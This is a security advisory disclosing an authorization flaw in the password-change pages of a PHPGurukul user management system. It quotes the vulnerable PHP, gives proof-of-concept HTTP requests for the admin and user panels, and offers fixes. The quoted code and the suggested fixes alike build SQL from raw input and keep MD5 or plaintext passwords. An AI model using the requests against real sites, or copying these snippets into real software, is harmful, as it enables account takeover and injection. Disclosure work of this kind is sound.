# Vulnerability Advisory: Broken Access Control / Improper Authorization in Password Change

### Affected Product
- **Name:** User Registration & Login and User Management System With admin panel
- **Vendor Homepage:** [https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/](https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/)
- **Affected Version:** V3.3

---

### Directory Tree & Vulnerable Locations
```text
User Registration and login System with admin panel/
└── loginsystem/
    ├── change-password.php          ← user-side (Lines 10-17 vulnerable)
    └── admin/
        └── change-password.php      ← admin-side (Lines 9-16 vulnerable)
```

---

### Vulnerability Overview
- **Vulnerability Type:** Improper Authorization / Broken Access Control ([CWE-863](https://cwe.mitre.org/data/definitions/863.html))
- **Attack Type:** Remote, Authenticated
- **Vulnerable Parameter:** `currentpassword` (POST)
- **Vulnerable Endpoints:**
  1. User Panel: `/loginsystem/change-password.php`
  2. Admin Panel: `/loginsystem/admin/change-password.php`

---

### Vulnerability Details & Root Cause

The current-password verification queries in both the user and admin password-change routines check whether the submitted value matches **ANY** row in their respective database table (`users` or `admin`), rather than being scoped to the currently authenticated session owner's record.

#### 1. Admin-Side (`loginsystem/admin/change-password.php`, Lines 9–16)
```php
$oldpassword=md5($_POST['currentpassword']); 
$newpassword=md5($_POST['newpassword']);
$sql=mysqli_query($con,"SELECT password FROM admin where password='$oldpassword'");
$num=mysqli_fetch_array($sql);
if($num>0)
{
$adminid=$_SESSION['adminid'];
$ret=mysqli_query($con,"update admin set password='$newpassword' where id='$adminid'");
```
- **Flaw:** The query `SELECT password FROM admin where password='$oldpassword'` omits `WHERE id='$adminid'`. It returns a match if the password matches **any** admin in the `admin` table. Only the subsequent `UPDATE` statement is scoped to `$adminid`.

#### 2. User-Side (`loginsystem/change-password.php`, Lines 10–17)
```php
$oldpassword=$_POST['currentpassword']; 
$newpassword=$_POST['newpassword'];
$sql=mysqli_query($con,"SELECT password FROM users where password='$oldpassword'");
$num=mysqli_fetch_array($sql);
if($num>0)
{
$userid=$_SESSION['id'];
$ret=mysqli_query($con,"update users set password='$newpassword' where id='$userid'");
```
- **Flaw:** Similarly, the query `SELECT password FROM users where password='$oldpassword'` omits `WHERE id='$userid'`. It returns true if **any** user in the system has that password, allowing the logged-in session user to update their own password using another user's current password.

---

### Difference From Related Reports (CVE-2025-28011 Distinction)
This vulnerability is strictly distinct from **CVE-2025-28011** (which reports SQL Injection on the `currentpassword` parameter):
- **CVE-2025-28011** is an input-sanitization / injection vulnerability where unescaped input allows SQL syntax injection.
- **This vulnerability (CWE-863)** is a pure authorization / business logic flaw. Even if all queries are completely parameterized with prepared statements and 100% immune to SQL injection, this vulnerability **still exists** because the verification query structurally lacks a per-session user identity constraint (`WHERE id='$adminid'` / `WHERE id='$userid'`). Reviewers must not classify this as a duplicate of CVE-2025-28011.

---

### Proof of Concept (PoC)

#### Admin Panel PoC
1. Log in to the admin panel with valid credentials (e.g. `admin` / `Test@12345`).
2. Navigate to **Admin > Change Password** (`/loginsystem/admin/change-password.php`).
3. Intercept and send the request supplying the password of **any** existing admin in `currentpassword`:
```http
POST /loginsystem/admin/change-password.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=<admin_session>
Content-Type: application/x-www-form-urlencoded

currentpassword=<any_valid_admin_password>&newpassword=Hacked999&update=Update
```
4. The server responds `"Password Changed Successfully !!"` and updates the session-holding admin's password.

#### User Panel PoC
1. Log in to the user portal (`/loginsystem/login.php`) as User A.
2. Navigate to **Change Password** (`/loginsystem/change-password.php`).
3. In `currentpassword`, enter the password of User B (or any known common password used by any other registered user in the database).
```http
POST /loginsystem/change-password.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=<user_session>
Content-Type: application/x-www-form-urlencoded

currentpassword=<user_B_password>&newpassword=NewPassword123!&update=Change
```
4. The server validates the existence of the password in the `users` table and successfully updates User A's password.

---

### Impact
- **Broken Re-authentication Barrier:** The current-password verification is intended as a critical defense-in-depth gate against hijacked/stolen sessions (XSS, session fixation, physical access).
- **Session Hijacking to Permanent Takeover:** An attacker with temporary session access can bypass the current-password gate by using any known password belonging to any other user/admin account in the database, allowing them to permanently seize the account.

---

### Remediation & Mitigation

Scope the `SELECT` verification query to the authenticated session user ID:

#### 1. Admin Fix (`/loginsystem/admin/change-password.php`):
```php
$adminid = $_SESSION['adminid'];
$sql = mysqli_query($con, "SELECT password FROM admin WHERE id='$adminid' AND password='$oldpassword'");
```

#### 2. User Fix (`/loginsystem/change-password.php`):
```php
$userid = $_SESSION['id'];
$sql = mysqli_query($con, "SELECT password FROM users WHERE id='$userid' AND password='$oldpassword'");
```

> **Best Practice Recommendation:** Always use prepared statements (parameterized queries) with `mysqli_stmt` or PDO, and replace plaintext/MD5 password storage with modern hashing algorithms (`password_hash()` and `password_verify()`).